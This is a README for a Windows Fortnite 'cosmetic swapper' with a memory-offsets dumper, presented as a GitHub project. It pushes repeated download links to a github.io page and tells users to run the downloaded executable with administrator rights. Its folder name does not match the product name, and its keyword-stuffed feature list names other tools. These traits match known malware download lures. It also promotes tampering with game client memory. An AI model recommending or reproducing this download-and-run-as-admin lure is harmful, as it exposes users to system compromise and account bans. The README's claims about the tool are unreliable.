# Saturn Galaxy v2026 - Fortnite Cosmetic Swapper Suite

> **A Windows utility for changing Fortnite visuals and emotes.** Saturn Galaxy combines a responsive interface with support for legacy OG Fortnite assets and local cosmetic swapping.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucasicocooper666/saturn-galaxy-windows-swapper?style=flat-square)](https://github.com/lucasicocooper666/saturn-galaxy-windows-swapper)

---

<p align="center">
  <a href="https://lucasicocooper666.github.io/saturn-galaxy-windows-swapper/">
    <img src="https://img.shields.io/badge/Download-Saturn%20Galaxy%20Script-brightgreen?style=for-the-badge" alt="Download Saturn Galaxy Script">
  </a>
</p>

> **[Download Saturn Galaxy](https://lucasicocooper666.github.io/saturn-galaxy-windows-swapper/)**

---

[Download Latest Build](https://lucasicocooper666.github.io/saturn-galaxy-windows-swapper/)

---

## What Saturn Galaxy Does

Saturn Galaxy gives Fortnite players a way to test different cosmetic appearances and emote combinations. Through local asset swapping, it can change visual items such as character skins, backblings, pickaxes, wraps, and emotes from a single interface. The 2026 edition is designed for faster interaction and broader compatibility with current Fortnite updates while retaining access to older OG Fortnite assets.

The suite fits into Galaxy Swapper v2 workflows and provides an offsets dumper to refresh swap information whenever Fortnite receives a patch. Its interface supports multiple languages, while the AI recommendation feature helps surface cosmetic combinations based on usage trends and community presets. Saturn Galaxy operates on Windows and receives community-driven maintenance.

---

## Included Capabilities

- **Emote Changer** - Assigns equipped emotes from any available emote ID in the game database
- **Visual Swapper** - Uses local asset files to replace skins, backblings, pickaxes, and wraps
- **Offsets Dumper** - Extracts and refreshes memory offsets for cosmetic IDs following Fortnite updates
- **ogfn Legacy Support** - Keeps original Fortnite cosmetic assets from earlier seasons usable
- **Galaxy Swapper v2 Integration** - Supports existing Galaxy Swapper configurations and saved presets
- **Responsive UI** - Adjusts to varying resolutions and window dimensions without breaking the layout
- **Multilingual Support** - Provides the interface in several languages for users worldwide
- **AI-Powered Recommendations** - Displays suggested cosmetic combinations using usage patterns and popular community presets

---

## Installation and First Run

1. Use the download link above to obtain the newest release.
2. Extract the contents of the `Vanguard-Swapper-Rebirth-2026` folder wherever you want to store the tool.
3. Start `SaturnGalaxy.exe` with administrator privileges so it can access memory correctly.
4. Open Fortnite and wait until the main menu is displayed.
5. Choose the cosmetic slots you want to modify in Saturn Galaxy, then apply the changes.

Optional command-line startup:

```text
SaturnGalaxy.exe --auto-offsets --lang en
```

---

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `auto-offsets` | Enabled | Retrieves the newest cosmetic offsets when the program starts |
| `lang` | `en` | Sets the interface language: en, fr, de, es, pt, ru, zh |
| `hotkey-toggle` | `F6` | Shows or hides the swap preview overlay |
| `legacy-mode` | Disabled | Turns on swapping for OG Fortnite assets |
| `ai-recommend` | Enabled | Adds AI-generated suggestions to the cosmetic browser |

---

## System and Game Compatibility

- **Platform**: Windows 10 / 11 (64-bit)
- **Game Version**: Fortnite Chapter 6 Season 2 (2026) and later
- **Known Limitations**: Console and macOS are not supported; administrator access is required; cosmetic modifications occur client-side and are not visible to other players

---

## Frequently Asked Questions

**What is the installation process?**  
Unpack the downloaded archive and launch the executable. Saturn Galaxy does not require additional dependencies.

**Could a Fortnite update stop it from working?**  
Fortnite patches can change the offsets required by the tool. Turn on `auto-offsets`, or run the offsets dumper manually after an update.

**Can I choose specific cosmetics?**  
Yes. The built-in browser lets you select individual cosmetic IDs, and custom presets can also be imported.

**Is the current Fortnite release supported?**  
Saturn Galaxy is updated in line with major Fortnite patches. Refer to the release notes for the current compatibility status.

**Could using the tool affect my game account?**  
Use Saturn Galaxy at your own discretion. It changes client-side memory only, but Epic Games' terms of service may still apply.

**Where does the application keep presets?**  
Saved presets are located in the `presets` folder within the installation directory.

---

## License

Saturn Galaxy is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
